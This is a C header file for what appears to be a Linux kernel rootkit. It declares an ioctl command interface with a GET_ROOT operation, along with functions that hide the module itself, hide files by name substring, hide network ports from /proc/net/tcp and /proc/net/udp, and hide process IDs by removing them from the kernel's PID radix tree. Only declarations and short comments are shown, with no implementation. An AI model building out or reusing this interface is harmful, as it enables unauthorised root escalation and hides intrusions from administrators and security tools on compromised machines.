#include <linux/mutex.h>
#include "devices.h"
#include "fs_helper.h"
#include "internel.h"
#include "syscall_helper.h"

enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };

struct struct_list {
    union {
        char *name;
        unsigned long num;
    };
    struct list_head list;
    char data[0];
};

/**
 * cmd_ioctl - VFS interface to execute command
 */
long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg);

void utils_init(void);

/**
 * hide_module - Hide the current module
 */
void hide_module(void);

/**
 * show_module - Show the current module
 */
void show_module(void);

/**
 * hide_file - Hide the file with substring name.
 */
void hide_file(const char *name);

/**
 * show_file - Show the file hided by `hide_file`.
 */
void show_file(const char *name);

/**
 * hide_port - Hide the port shown by /proc/net/tcp and /proc/net/udp
 */
void hide_port(unsigned int port);


/**
 * show_port - Show the port hided by `hide_port`
 */
void show_port(unsigned int port);


/**
 * hide_pid - Hide the pid by remove the element from radix tree
 */
void hide_pid(unsigned int tgid);


/**
 * show_pid - Show the pid hided by `hide_pid`
 */
void show_pid(unsigned int tgid);
